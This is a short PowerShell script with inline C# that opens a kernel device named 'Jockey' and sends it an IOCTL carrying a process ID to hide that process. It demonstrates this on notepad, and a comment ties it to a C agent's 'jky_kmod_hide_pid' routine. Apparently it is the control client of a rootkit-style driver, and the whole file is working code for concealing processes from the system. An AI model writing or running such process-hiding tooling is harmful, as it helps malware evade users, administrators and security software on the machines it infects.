# hide_notepad.ps1 — directly call jockey driver IOCTL to hide notepad
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class JockeyDrv {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,
        uint dwShareMode, IntPtr lpSecurityAttributes,
        uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode,
        byte[] lpInBuffer, int nInBufferSize,
        byte[] lpOutBuffer, int nOutBufferSize,
        out int lpBytesReturned, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static bool HidePid(uint pid) {
        IntPtr h = CreateFile(@"\\.\Jockey", 0xC0000000 | 0x40000000,
            0x00000001 | 0x00000002, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == IntPtr.Zero || h == new IntPtr(-1)) {
            Console.WriteLine("[-] open device failed: " + Marshal.GetLastWin32Error());
            return false;
        }

        // C agent sends exactly 4 bytes (ULONG pid), matching jky_kmod_hide_pid()
        byte[] inbuf = BitConverter.GetBytes(pid);
        int br;
        bool ok = DeviceIoControl(h, 0x80002004, inbuf, 4, null, 0, out br, IntPtr.Zero);

        int err = Marshal.GetLastWin32Error();
        CloseHandle(h);
        if (!ok) Console.WriteLine("[-] IOCTL failed, err=" + err);
        return ok;
    }
}
"@

$np = Get-Process notepad -ErrorAction SilentlyContinue
if (-not $np) {
    Write-Host "[-] notepad not running"
    exit 1
}

Write-Host "[*] hiding pid $($np.Id)"
if ([JockeyDrv]::HidePid([uint32]$np.Id)) {
    Write-Host "[+] hidden"
} else {
    Write-Host "[-] failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}
